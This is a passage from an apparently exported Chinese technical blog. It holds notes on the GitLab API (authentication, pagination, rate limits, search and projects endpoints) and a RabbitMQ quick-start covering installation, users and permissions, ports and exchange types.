https://gitlab.example.com/api/v4/projects?private_token=&lt;your_access_token&gt;</code></p>\n<p>或</p>\n<p><code>curl --header &quot;Private-Token: &lt;your_access_token&gt;&quot; https://gitlab.example.com/api/v4/projects</code></p>\n<p>或</p>\n<p><code>curl --header &quot;Authorization: Bearer &lt;your_access_token&gt;&quot; https://gitlab.example.com/api/v4/projects</code></p>\n<h2 id=\"响应状态码-官网文档地址\"><a href=\"#响应状态码-官网文档地址\" class=\"headerlink\" title=\"响应状态码(官网文档地址)\"></a>响应状态码(<a href=\"https://docs.gitlab.com/ee/api/README.html#status-codes\" target=\"_blank\" rel=\"noopener\">官网文档地址</a>)</h2><p>成功的状态码主要会有三种，失败的情况有多种，具体官网文档查看</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">状态码</th>\n<th align=\"center\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\"><code>200</code></td>\n<td align=\"center\">对于<code>GET</code>,<code>PUT</code>或<code>DELETE</code>请求，成功时返回的响应头中的状态码，并且返回的响应体包含json数据</td>\n</tr>\n<tr>\n<td align=\"center\"><code>201</code></td>\n<td align=\"center\">对于<code>POST</code>请求，成功时返回的响应头中的状态码，并且返回的响应体包含json数据</td>\n</tr>\n<tr>\n<td align=\"center\"><code>204</code></td>\n<td align=\"center\">表示服务器成功执行了请求，但返回的响应体无内容（即无响应体部分）</td>\n</tr>\n</tbody></table>\n<h2 id=\"分页-官网文档地址\"><a href=\"#分页-官网文档地址\" class=\"headerlink\" title=\"分页(官网文档地址)\"></a>分页(<a href=\"https://docs.gitlab.com/ee/api/README.html#pagination\" target=\"_blank\" rel=\"noopener\">官网文档地址</a>)</h2><p>提供两种分页方式</p>\n<ol>\n<li>键集分页（性能原因考虑，官网推荐这种方式）</li>\n<li>偏移分页</li>\n</ol>\n<h3 id=\"偏移分页\"><a href=\"#偏移分页\" class=\"headerlink\" title=\"偏移分页\"></a>偏移分页</h3><p>请求参数控制分页</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">参数名</th>\n<th align=\"center\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\"><code>page</code></td>\n<td align=\"center\">页码（默认1）</td>\n</tr>\n<tr>\n<td align=\"center\"><code>per_page</code></td>\n<td align=\"center\">每页数量（默认20，最大100）</td>\n</tr>\n</tbody></table>\n<h3 id=\"键集分页\"><a href=\"#键集分页\" class=\"headerlink\" title=\"键集分页\"></a>键集分页</h3><p>键集分页可以更有效地检索页面，并且与基于偏移的分页不同，运行时与集合的大小无关（翻译自官网）。</p>\n<p>请求参数控制分页</p>\n<table>\n<thead>\n<tr>\n<th>参数名</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>pagination</code></td>\n<td><code>keyset</code> (为了允许键集分页而设定)</td>\n</tr>\n<tr>\n<td><code>per_page</code></td>\n<td>每页数量（默认20，最大100）</td>\n</tr>\n</tbody></table>\n<p>例（<strong>官网文档案例</strong>）：</p>\n<p>请求（官网文档上<code>--request PUT</code>应该是错的，实际请求应该去掉）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl --request PUT --header &quot;PRIVATE-TOKEN: &lt;your_access_token&gt;&quot; &quot;https://gitlab.example.com/api/v4/projects?pagination=keyset&amp;per_page=50&amp;order_by=id&amp;sort=asc&quot;</span><br></pre></td></tr></table></figure>\n\n<p>响应信息（<strong>官网文档案例</strong>中响应中包含到下一页的链接）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 200 OK</span><br><span class=\"line\">...</span><br><span class=\"line\">Link: &lt;https://gitlab.example.com/api/v4/projects?pagination=keyset&amp;per_page=50&amp;order_by=id&amp;sort=asc&amp;id_after=42&gt;; rel=&quot;next&quot;</span><br><span class=\"line\">Status: 200 OK</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p><strong>按官网文档介绍</strong>，下一页链接中包含额外的过滤器<code>id_after</code>，过滤器类型取决于<code>order_by</code>选项，当没有更多的记录时，响应头不包含<code>Link</code>字段。<code>rel=&quot;next&quot;</code>，并不是唯一的情况，还可能有<code>rel=&quot;first&quot;</code>、rel=”last”，<code>Link</code>字段中也可能同时存在多个<code>&lt;....&gt;; rel=&quot;...&quot;</code>，解码时需要注意。</p>\n<p>仅对特定的资源支持键集分页(实际上应该不止这个接口)</p>\n<table>\n<thead>\n<tr>\n<th>Resource</th>\n<th>Order</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a href=\"https://docs.gitlab.com/ee/api/projects.html\" target=\"_blank\" rel=\"noopener\">/api/v4/projects</a></td>\n<td><code>order_by=id</code> only</td>\n</tr>\n</tbody></table>\n<p><strong>实际验证之后发现</strong>，与文档描述是不一样的，响应头<code>Link</code>字段中的链接增加的参数不是<code>order_by</code>字段，而是<code>page=2</code>参数，以及增加了<code>/api/v4/projects</code>接口的其他参数，如下所示：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 200 OK</span><br><span class=\"line\">...</span><br><span class=\"line\">Link: &lt;https://gitlab.com/api/v4/projects?membership=false&amp;order_by=id&amp;owned=false&amp;page=2&amp;pagination=keyset&amp;per_page=50&amp;repository_checksum_failed=false&amp;simple=false&amp;sort=asc&amp;starred=false&amp;statistics=false&amp;wiki_checksum_failed=false&amp;with_custom_attributes=false&amp;with_issues_enabled=false&amp;with_merge_requests_enabled=false&gt;; rel=&quot;next&quot;, &lt;https://gitlab.com/api/v4/projects?membership=false&amp;order_by=id&amp;owned=false&amp;page=1&amp;pagination=keyset&amp;per_page=50&amp;repository_checksum_failed=false&amp;simple=false&amp;sort=asc&amp;starred=false&amp;statistics=false&amp;wiki_checksum_failed=false&amp;with_custom_attributes=false&amp;with_issues_enabled=false&amp;with_merge_requests_enabled=false&gt;; rel=&quot;first&quot;</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p>可能是官网文档较长时间没更新了吧</p>\n<h3 id=\"分页响应头\"><a href=\"#分页响应头\" class=\"headerlink\" title=\"分页响应头\"></a>分页响应头</h3><p>分页响应头中包含下面字段</p>\n<table>\n<thead>\n<tr>\n<th>响应头</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>X-Total</code></td>\n<td>结果总数量（并不一定返回，官网介绍出于性能原因考虑结果集大于1000时就不会返回，实际上不返回的情况可能更多）</td>\n</tr>\n<tr>\n<td><code>X-Total-Pages</code></td>\n<td>结果总页数（并不一定返回，官网介绍出于性能原因考虑结果集大于1000时就不会返回，实际上不返回的情况可能更多）</td>\n</tr>\n<tr>\n<td><code>X-Per-Page</code></td>\n<td>每页多少条</td>\n</tr>\n<tr>\n<td><code>X-Page</code></td>\n<td>当期所在页</td>\n</tr>\n<tr>\n<td><code>X-Next-Page</code></td>\n<td>下一页</td>\n</tr>\n<tr>\n<td><code>X-Prev-Page</code></td>\n<td>前一页</td>\n</tr>\n</tbody></table>\n<p>分页这里还是有不少坑的，实际表现与官方文档描述诸多不符</p>\n<p>键集分页响应头中另外还包含如下字段</p>\n<table>\n<thead>\n<tr>\n<th>响应头</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>Link</code></td>\n<td>可能包含下一页的请求地址、上一页的请求地址、第一页的请求地址、最后一页的请求地址。仅仅是可能包含，不一定包含，比如，当结果总条数特别多时，就不会包含最后一页的请求地址（可能是性能原因考虑，gitlab服务器上实际上没有查询完所有结果就响应了）；当页面位于第一页时，不会包含上一页的请求地址。</td>\n</tr>\n</tbody></table>\n<h2 id=\"频率限制-官网文档地址\"><a href=\"#频率限制-官网文档地址\" class=\"headerlink\" title=\"频率限制(官网文档地址)\"></a>频率限制(<a href=\"https://docs.gitlab.com/ee/security/rate_limits.html\" target=\"_blank\" rel=\"noopener\">官网文档地址</a>)</h2><p>实际上频率限制这一块文档，基本是面向2B客户（即在自己服务器上部署gitlab的客户）的，API查询从官网文档中得不到多少信息。<code>Rack Attach</code>章节，可能会有些许借鉴意义，它旨在限制来自大量请求的IP地址的请求。</p>\n<h3 id=\"Rack-Attach\"><a href=\"#Rack-Attach\" class=\"headerlink\" title=\"Rack Attach\"></a>Rack Attach</h3><p>API查询的请求头中返回的字段会包含如下几个(<a href=\"https://docs.gitlab.com/ee/user/gitlab_com/index.html#haproxy-api-throttle\" target=\"_blank\" rel=\"noopener\">此处官网链接</a>)：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">RateLimit-Limit: 600</span><br><span class=\"line\">RateLimit-Observed: 6</span><br><span class=\"line\">RateLimit-Remaining: 594</span><br><span class=\"line\">RateLimit-Reset: 1563325137</span><br><span class=\"line\">RateLimit-ResetTime: Wed, 17 Jul 2019 00:58:57 GMT</span><br></pre></td></tr></table></figure>\n\n<p>其中<code>RateLimit-Remaining</code>表示到重置时间<code>RateLimit-Reset</code>为止，能进行多少次请求</p>\n<p>对于某些受保护的接口，每分钟超过10次的情况下，会触发code <code>429</code>，并且响应头中会包含如下信息。表明当前IP被服务器限制请求，可在60秒后重新发起请求</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Retry-After: 60</span><br></pre></td></tr></table></figure>\n\n<p>默认情况下，受保护的接口有</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">default[&apos;gitlab&apos;][&apos;gitlab-rails&apos;][&apos;rack_attack_protected_paths&apos;] = [</span><br><span class=\"line\">  &apos;/users/password&apos;,</span><br><span class=\"line\">  &apos;/users/sign_in&apos;,</span><br><span class=\"line\">  &apos;/api/#&#123;API::API.version&#125;/session.json&apos;,</span><br><span class=\"line\">  &apos;/api/#&#123;API::API.version&#125;/session&apos;,</span><br><span class=\"line\">  &apos;/users&apos;,</span><br><span class=\"line\">  &apos;/users/confirmation&apos;,</span><br><span class=\"line\">  &apos;/unsubscribes/&apos;,</span><br><span class=\"line\">  &apos;/import/github/personal_access_token&apos;,</span><br><span class=\"line\">  &apos;/admin/session&apos;</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"设置项目的请求频率\"><a href=\"#设置项目的请求频率\" class=\"headerlink\" title=\"设置项目的请求频率\"></a>设置项目的请求频率</h3><p>这一块与API请求无关，是2B客户设置请求频率相关的内容，可以在<a href=\"https://docs.gitlab.com/ee/user/admin_area/settings/user_and_ip_rate_limits.html\" target=\"_blank\" rel=\"noopener\">User and IP rate limits</a>和<a href=\"https://docs.gitlab.com/ee/user/admin_area/settings/rate_limits_on_raw_endpoints.html\" target=\"_blank\" rel=\"noopener\">Rate limits on raw endpoints</a>章节中查看</p>\n<h2 id=\"查询相关接口官网文档地址\"><a href=\"#查询相关接口官网文档地址\" class=\"headerlink\" title=\"查询相关接口官网文档地址\"></a>查询相关接口<a href=\"https://docs.gitlab.com/ee/api/README.html#status-codes\" target=\"_blank\" rel=\"noopener\">官网文档地址</a></h2><h3 id=\"search接口\"><a href=\"#search接口\" class=\"headerlink\" title=\"search接口\"></a>search接口</h3><p>全局（不限项目project/不限组织group）search接口路径</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/api/v4/search</span><br></pre></td></tr></table></figure>\n\n<p>参数</p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>scope</code></td>\n<td>搜索范围</td>\n</tr>\n<tr>\n<td><code>search</code></td>\n<td>搜索的字符串</td>\n</tr>\n</tbody></table>\n<p>scope取值</p>\n<table>\n<thead>\n<tr>\n<th>取值</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>projects</td>\n<td>从项目名称和项目描述中搜索</td>\n</tr>\n<tr>\n<td>merge_requests</td>\n<td>从merge记录搜索</td>\n</tr>\n<tr>\n<td>issues</td>\n<td>从issue搜索</td>\n</tr>\n<tr>\n<td>milestones</td>\n<td>从发布的里程碑版本搜索</td>\n</tr>\n<tr>\n<td>snippet_titles</td>\n<td>从代码片（与项目没有关系，是另一种与项目同级别的产品）标题搜索</td>\n</tr>\n<tr>\n<td>snippet_blobs</td>\n<td>从代码片的内容搜索</td>\n</tr>\n<tr>\n<td>wiki_blobs</td>\n<td>从项目的文件内容搜索（在gitlab官方代码服务器上没法使用，需要在自己服务器部署gitlab服务器，并安装elasticsearch才能使用），在官网描述中看不出wiki_blobs与blobs有何区别</td>\n</tr>\n<tr>\n<td>commits</td>\n<td>从commit中搜索（在gitlab官方代码服务器上没法使用，需要在自己服务器部署gitlab服务器，并安装elasticsearch才能使用）</td>\n</tr>\n<tr>\n<td>blobs</td>\n<td>从项目的文件内容搜索（在gitlab官方代码服务器上没法使用，需要在自己服务器部署gitlab服务器，并安装elasticsearch才能使用）</td>\n</tr>\n<tr>\n<td>users</td>\n<td>从用户名搜索</td>\n</tr>\n</tbody></table>\n<h3 id=\"projects接口\"><a href=\"#projects接口\" class=\"headerlink\" title=\"projects接口\"></a>projects接口</h3><p>接口路径</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/api/v4/projects</span><br></pre></td></tr></table></figure>\n\n<p>参数</p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>类型</th>\n<th>是否必传</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>archived</code></td>\n<td>boolean</td>\n<td>no</td>\n<td>过滤打包状态</td>\n</tr>\n<tr>\n<td><code>visibility</code></td>\n<td>string</td>\n<td>no</td>\n<td>过滤可见范围 <code>public</code>, <code>internal</code>, <code>private</code></td>\n</tr>\n<tr>\n<td><code>order_by</code></td>\n<td>string</td>\n<td>no</td>\n<td>排序依据字段，可以为<code>id</code>, <code>name</code>, <code>path</code>, <code>created_at</code>, <code>updated_at</code>, <code>last_activity_at</code> 字段，默认是 <code>created_at</code></td>\n</tr>\n<tr>\n<td><code>sort</code></td>\n<td>string</td>\n<td>no</td>\n<td>排序，<code>asc</code> / <code>desc</code> ，默认是 <code>desc</code></td>\n</tr>\n<tr>\n<td><code>search</code></td>\n<td>string</td>\n<td>no</td>\n<td>搜索字符串</td>\n</tr>\n<tr>\n<td><code>simple</code></td>\n<td>boolean</td>\n<td>no</td>\n<td>true时，只返回少量简单字段</td>\n</tr>\n<tr>\n<td><code>owned</code></td>\n<td>boolean</td>\n<td>no</td>\n<td>过滤，仅当前用户拥有的项目</td>\n</tr>\n<tr>\n<td><code>membership</code></td>\n<td>boolean</td>\n<td>no</td>\n<td>过滤，仅当前用户所属的项目</td>\n</tr>\n<tr>\n<td><code>starred</code></td>\n<td>boolean</td>\n<td>no</td>\n<td>过滤，仅当前用户加星的项目</td>\n</tr>\n<tr>\n<td><code>statistics</code></td>\n<td>boolean</td>\n<td>no</td>\n<td>包括项目统计</td>\n</tr>\n<tr>\n<td><code>with_custom_attributes</code></td>\n<td>boolean</td>\n<td>no</td>\n<td>过滤，包含<a href=\"https://docs.gitlab.com/ee/api/custom_attributes.html\" target=\"_blank\" rel=\"noopener\">自定义属性 custom_attributes</a>设置（仅管理员）</td>\n</tr>\n<tr>\n<td><code>with_issues_enabled</code></td>\n<td>boolean</td>\n<td>no</td>\n<td>过滤，根据issues_enabled值</td>\n</tr>\n<tr>\n<td><code>with_merge_requests_enabled</code></td>\n<td>boolean</td>\n<td>no</td>\n<td>过滤，根据merge_requests_enabled值</td>\n</tr>\n<tr>\n<td><code>with_programming_language</code></td>\n<td>string</td>\n<td>no</td>\n<td>过滤，按编程语言过滤</td>\n</tr>\n<tr>\n<td><code>wiki_checksum_failed</code></td>\n<td>boolean</td>\n<td>no</td>\n<td>wiki校验值计算失败的项目(<a href=\"https://about.gitlab.com/pricing/\" target=\"_blank\" rel=\"noopener\">GitLab Premium</a> 11.2中的<a href=\"https://gitlab.com/gitlab-org/gitlab/merge_requests/6137\" target=\"_blank\" rel=\"noopener\">介绍</a>)</td>\n</tr>\n<tr>\n<td><code>repository_checksum_failed</code></td>\n<td>boolean</td>\n<td>no</td>\n<td>repository校验值计算失败的项目(<a href=\"https://about.gitlab.com/pricing/\" target=\"_blank\" rel=\"noopener\">GitLab Premium</a> 11.2中的<a href=\"https://gitlab.com/gitlab-org/gitlab/merge_requests/6137\" target=\"_blank\" rel=\"noopener\">介绍</a>)</td>\n</tr>\n<tr>\n<td><code>min_access_level</code></td>\n<td>integer</td>\n<td>no</td>\n<td>过滤，仅当前用户的 <a href=\"https://docs.gitlab.com/ee/api/members.html\" target=\"_blank\" rel=\"noopener\">最低访问权限级别</a></td>\n</tr>\n<tr>\n<td><code>id_after</code></td>\n<td>integer</td>\n<td>no</td>\n<td>过滤，限制为ID大于指定ID的项目</td>\n</tr>\n<tr>\n<td><code>id_before</code></td>\n<td>integer</td>\n<td>no</td>\n<td>过滤，限制为ID小于指定ID的项目</td>\n</tr>\n</tbody></table>\n<p>返回值中有两个需要注意的参数<code>repository_access_level</code>和<code>visibility</code>，只有<code>repository_access_level</code>参数值为<code>enabled</code>且<code>visibility</code>参数值为<code>public</code>时才可以clone该仓库</p>\n<p>该接口，经身份验证的用户和未经身份验证的用户均可使用，但未经身份验证的用户响应内容中的信息会更少，与<code>simple=true</code>的时候相同。</p>\n<p>当请求中包含自定义属性时，请求url传参如下所示</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /api/v4/projects?custom_attributes[key]=value&amp;custom_attributes[other_key]=other_value</span><br></pre></td></tr></table></figure>\n\n<p>阅读文档后，没怎么弄懂上面<code>/api/v4/projects</code>和<code>/api/v4/search?scope=projects</code>这两个接口有什么重要的区别，姑且认为它们是可以相互取代的，使用任意一个皆可。</p>\n"},{"title":"RabbitMQ快速入门手册","date":"2019-04-22T09:01:43.000Z","keywords":"rabbitmq, 教程，安装","rId":"MB-19042201","_content":"\n## 1. 安装\n\n使用docker方式，拉取镜像uetty/rabbitmq\n\n具体Dockerfile的命令 -> [Dockerfile](<https://github.com/Uetty/dockerfile/blob/master/docker-rabbitmq/Dockerfile>)\n\n\n\n额外的TIP: 由于Linux机器上会有最大打开文件个数限制，Rabbitmq又依赖文件操作，所以应将Linux的所有用户打开文件限制调高到64000，Rabbitmq程序所属的用户的打开文件限制调高到64000，这一块见官网（[文件限制](https://www.rabbitmq.com/install-debian.html#kernel-resource-limits)）\n\n\n\n## 2. 虚拟主机\n\nRabbitmq是多租户系统，存在虚拟主机（把它想象成为数据库）的概念，用户对它的连接、队列、绑定、路由等操作是基于虚拟主机上的。通过`rabbitmqctl add_vhost vhostname`命令来增加虚拟主机，`rabbitmqctl delete_vhost vhostname`命令来删除虚拟主机，`rabbitmqctl list_vhosts [name tracing]`命令来显示虚拟主机列表。\n\n设置虚拟主机并发客户端总数：`rabbitmqctl set_vhost_limits -p test '{\"max-connections\": 256}'`\n\n设置虚拟主机最大队列数：`rabbitmqctl set_vhost_limits -p test '{\"max-queues\": 1024}'`\n\n显示虚拟主机参数：`rabbitmqctl list_vhost_limits -p test`\n\n## 3. 启动与用户操作及权限\n\n启动命令：`service rabbitmq-server start`  \n\nRabbit提供了用户名密码的方式认证和X509证书的方式认证，，这里只记用户名密码的方式 \n\n初始用户：刚创建的实例，有默认的用户guest密码guest，但只能在本机登陆（不鼓励将其配置成能远程登陆，其他用户默认是可以远程访问的） \n\n### 用户设置（[官网地址](https://www.rabbitmq.com/rabbitmqctl.8.html#User_Management) ）\n\n添加用户：`rabbitmqctl add_user janeway changeit` \n\n删除用户：`rabbitmqctl delete_user janeway` \n\n变更密码：`rabbitmqctl change_password janeway newpass` \n\n验证用户名密码：`rabbitmqctl authenticate_user janeway verifyit` \n\n显示用户列表：`rabbitmqctl list_users` \n\n### 用户权限\n\n设置用户TAG：`rabbitmqctl set_user_tags janeway administrator` \n\n删除用户TAG：`rabbitmqctl set_user_tags janeway` \n\nTIP: 用户TAG与全局权限绑定（包括登陆可视化管理界面的权限等），具体见官网（[TAG权限表](<https://www.rabbitmq.com/management.html#permissions>)）\n\n| Tag           | Capabilities                                                 |\n| :------------ | :----------------------------------------------------------- |\n| (None)        | No access to the management plugin                           |\n| management    | Anything the user could do via messaging protocols plus:List virtual hosts to which they can log in via AMQPView all queues, exchanges and bindings in \"their\" virtual hostsView and close their own channels and connectionsView \"global\" statistics covering all their virtual hosts, including activity by other users within them |\n| policymaker   | Everything \"management\" can plus:View, create and delete policies and parameters for virtual hosts to which they can log in via AMQP |\n| monitoring    | Everything \"management\" can plus:List all virtual hosts, including ones they could not access using messaging protocolsView other users's connections and channelsView node-level data such as memory use and clusteringView truly global statistics for all virtual hosts |\n| administrator | Everything \"policymaker\" and \"monitoring\" can plus:Create and delete virtual hostsView, create and delete usersView, create and delete permissionsClose other users's connections |\n\n设置用户在虚拟主机上的权限：`rabbitmqctl set_permissions -p vhostname username \".*\" \".*\" \".*\"` 后面三个参数分别表示配置权限、写权限、读权限，引号内的内容用正则表达式匹配队列键名（不指定[--vhost/-p]参数，默认主机为'/' ，下同） \n\n清除用户在虚拟主机上的权限：` rabbitmqctl clear_permissions -p vhostname username`  \n\n显示某个用户在虚拟主机上的权限：` rabbitmqctl list_user_permissions uetty`  \n\n显示某个虚拟主机上的用户权限：`rabbitmqctl list_permissions -p vhostname`\n\n## 4. 端口介绍\n\n- 4369: [epmd](http://erlang.org/doc/man/epmd.html), a peer discovery service used by RabbitMQ nodes and CLI tools\n- 5672, 5671: used by AMQP 0-9-1 and 1.0 clients without and with TLS\n- 25672: used for inter-node and CLI tools communication (Erlang distribution server port) and is allocated from a dynamic range (limited to a single port by default, computed as AMQP port + 20000). Unless external connections on these ports are really necessary (e.g. the cluster uses [federation](https://www.rabbitmq.com/federation.html) or CLI tools are used on machines outside the subnet), these ports should not be publicly exposed. See [networking guide](https://www.rabbitmq.com/networking.html) for details.\n- 35672-35682: used by CLI tools (Erlang distribution client ports) for communication with nodes and is allocated from a dynamic range (computed as server distribution port + 10000 through server distribution port + 10010). See [networking guide](https://www.rabbitmq.com/networking.html) for details.\n- 15672: [HTTP API](https://www.rabbitmq.com/management.html) clients, [management UI](https://www.rabbitmq.com/management.html) and [rabbitmqadmin](https://www.rabbitmq.com/management-cli.html) (only if the [management plugin](https://www.rabbitmq.com/management.html) is enabled)\n- 61613, 61614: [STOMP clients](https://stomp.github.io/stomp-specification-1.2.html) without and with TLS (only if the [STOMP plugin](https://www.rabbitmq.com/stomp.html) is enabled)\n- 1883, 8883: ([MQTT clients](http://mqtt.org/) without and with TLS, if the [MQTT plugin](https://www.rabbitmq.com/mqtt.html) is enabled\n- 15674: STOMP-over-WebSockets clients (only if the [Web STOMP plugin](https://www.rabbitmq.com/web-stomp.html) is enabled)\n- 15675: MQTT-over-WebSockets clients (only if the [Web MQTT plugin](https://www.rabbitmq.com/web-mqtt.html) is enabled)\n\n5671端口：AMQP协议使用，且TLS加密\n\n5672端口：AMQP协议使用，且不加密\n\n15672端口：HTTP协议使用，或者开启可视化管理页面后，页面地址所在端口\n\n61613端口：STOMP协议使用，且不加密\n\n61614端口：STOMP协议使用，且TLS加密\n\n1883端口：MQTT协议使用，且不加密\n\n8883端口：MQTT协议使用，且TLS加密\n\n15674端口：Websocket协议上的STOMP协议使用\n\n15675端口：Websocket协议上的MQTT协议使用\n\n\n\nTIP:  较常用的是5672端口（一般选择AMQP协议，有加密需求的化是5671端口）和15672端口\n\n## 5. 交换机、队列与消息的路由\n\n在Rabbitmq中，生产者是将消息推送到交换机里，交换机负责将消息路由到队列中，消费者再从队列中消费消息。这里涉及到了两个概念，`交换机`和`队列`，在此基础上引申出了三个操作：`交换机的声明`、`队列的声明`、`交换机和队列绑定的声明`，这三个操作的完成是基于`交换机名`、`队列名`、`路由键`这三个属性的。\n\n```\n1) 通过channel.exchangeDeclare(\"exchangeName\", BuiltinExchangeType.类型);声明交换机\n2) 通过String queueName = channel.queueDeclare().getQueue();声明队列，并返回自动生成的队列的名称\n   也可以通过channel.queueDeclare(queueName, durable, exclusive, autoDelete, arguments);声明命名的队列\n   第二种声明方式的参数解释：durable为是否持久化到磁盘，它将使服务器重启后数据仍然存在；exclusive为是否排他队列，具有基于连接的排他性；autoDelete是否自动删除，在没有订阅者的情况下是否自动删除\n3) 通过channel.queueBind(queueName, \"exchangeName\", \"routingKey\");绑定队列和交换机\n```\n\nTIP:  队列本身还包含了许多属性，例如：名称、交换代理重启后是否仍保存、自动删除、队列长度等参数，在声明队列的时候可以给定。\n\n\n\n交换机种类主要有四种，以下介绍这几种交换机：\n\n1.  直连交换机(direct)\n\n```\n在直连交换机的三个声明操作中，交换机名、队列名都是不能为空字符串，路由键可以为空字符串但已被使用。发送到直连交换机的消息直接根据路由键进行完全匹配，将消息路由到所有以该路由键与该交换机绑定的队列中。\n\n1) 生产者通过channel.basicPublish(\"exchangeName\", routingKey, null, message.getBytes(\"UTF-8\"));提交数据到Rabbitmq\n\n2) 消费者通过channel.basicConsume(queueName, true, (consumerTag, delivery) -> {}, consumerTag -> { });从Rabbitmq消费消息\n```\n\n2.  扇形交换机(fanout)\n\n```\n该交换机的设计思想是一个消息广播，在扇形交换机的三个声明操作中，路由键名可以为空字符串（事实上它会被忽略）。发送到扇形交换机的消息，会被路由到所有绑定在该交换机上的队列中（与直连交换机不同的是不再根据路由键进行筛选）。\n\n1) 生产者通过channel.basicPublish(\"exchangeName\", \"\", null, message.getBytes(\"UTF-8\"));提交数据到Rabbitmq\n\n2) 消费者通过channel.basicConsume(queueName, true, (consumerTag, delivery) -> {}, consumerTag -> { });从Rabbitmq消费消息\n```\n\n3.  主题交换机(topic)\n\n```\n在主题交换机的三个声明中，路由键的命名是受限制的，必须由点号分割的多个单词或星号或井号组成，*用于匹配一个单词，井号用于匹配零到多个单词，发送到主题交换机的消息，会根据路由键匹配来路由到队列中。\n\n1) 生产者通过channel.basicPublish(EXCHANGE_NAME, routingKey, null, message.getBytes(\"UTF-8\"));发送数据到Rabbitmq\n\n2) 消费者通过channel.basicConsume(queueName, true, (consumerTag, delivery) -> {}, consumerTag -> { });从Rabbitmq消费消息\n```\n\n4.  首部交换机(match 和 headers)\n\n```\n在首部交换机中，路由键名可以是空字符串（事实上它会被忽略），它的路由规则转而由首部属性决定，其中最重要的一个属性是x-match，该属性有两个取值（any/all）,any表示发布消息时携带的键值对有一对能匹配上队列定义的其中一个就能，all表示所有的键值对需完全匹配。另外以x-开头的属性不被视作用于路由匹配的属性。\n该模式下，交换机和队列绑定需要增加headers值，可通过如下设置：\nMap<String, Object> arguments = new HashMap<String, Object>();\narguments.put(\"x-match\", \"any\");\narguments.put(\"arg1\", \"a1\");\narguments.put(\"latitude\", 51.5252949);\narguments.put(\"dataType\", \"json\");\nchannel.queueBind(queueName, EXCHANGE_NAME, \"\", arguments);\n\n使用：\n1) 生产者通过如下代码发送消息到Rabbitmq\nMap<String, Object> headers = new HashMap<String, Object>();\nheaders.put(\"latitude\",  51.5252949);\nheaders.put(\"longitude\", -0.0905493);\nchannel.basicPublish(exchangeName, \"\",\n             new AMQP.BasicProperties.Builder()\n               .headers(headers)\n               .build(),\n               message.getBytes(\"UTF-8\"));\n               \n2) 消费者通过channel.basicConsume(queueName, true, (consumerTag, delivery) -> {}, consumerTag -> { });从Rabbitmq消费消息\n```\n\n默认交换机规则是一个空字符串路由键的直连交换机定义[官网](<https://www.rabbitmq.com/tutorials/amqp-concepts.html#exchange-default>)，该交换机的路由键与队列键名相同，这使其看起来像是客户端直接提交消息到了队列中。所有新建的队列都天生绑定了这个默认交换机，它的存在也方便了一些简单需求的应用直接使用Rabbitmq。\n\n\n\n## 6. ACK、TRANSACTION、RECOVERY和QOS\n\n### ACK、TRANSACTION和RECOVERY\n\n​        消费者消费队列消息时，过程中可能由于网络原因或业务原因，出现连接断开或者消费者未接收到消息或者消费者不能成功处理消息，这个时候可能会导致数据的丢失。基于这一点，Rabbitmq提供了，TRANSACRION机制、ACK机制和RECOVERY机制。\n\n​        RECOVERY机制：Rabbitmq JAVA客户端提供连接恢复的功能，在启用该功能时，当客户端由于网络问题断开，会自动恢复客户端，包括恢复连接、恢复连接监听器、重新打开信道及监听器、恢复QOS设置、重新声明交换机、重新声明队列、恢复绑定和消费者，可以通过`factory.setAutomaticRecoveryEnabled(true)`来打开RECOVERY机制。\n\n​        